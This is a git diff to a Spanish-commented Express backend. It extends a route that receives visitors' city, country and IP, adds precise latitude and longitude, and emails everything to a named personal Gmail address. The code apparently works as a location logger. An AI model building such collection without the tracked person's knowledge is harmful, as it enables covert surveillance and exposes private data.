@@ -25,7 +25,7 @@ const transporter = nodemailer.createTransport({
 app.post('/enviar-ubicacion', (req, res) => {
     console.log("📩 Datos recibidos en el backend:", req.body); // ✅ Verifica en la terminal
 
-    const { ciudad, pais, ip } = req.body;
+    const { ciudad, pais, ip, longitud, latitud } = req.body;
 
     if (!ciudad || !pais || !ip) {
         return res.status(400).send("❌ Faltan datos de ubicación.");
@@ -37,7 +37,7 @@ app.post('/enviar-ubicacion', (req, res) => {
         from: 'tuemail@gmail.com',
         to: 'maximilianoalderete017@gmail.com',
         subject: 'Nueva Ubicación Detectada',
-        text: `📍 Ciudad: ${ciudad}\n🌎 País: ${pais}\n💻 IP: ${ip}`
+        text: `📍 Ciudad: ${ciudad}\n🌎 País: ${pais}\n💻 IP: ${ip} \n💻 latitud: ${latitud} \n💻 longitud: ${longitud}`
     };
 
     transporter.sendMail(mailOptions, (error, info) => {
@@ -59,5 +59,5 @@ app.get('/', (req, res) => {
 
 // Iniciar el servidor
 app.listen(3000, () => {
-    console.log('Servidor corriendo en http://localhost:3000');
+    console.log('Servidor corriendo en https://gail.onrender.com/');
 });
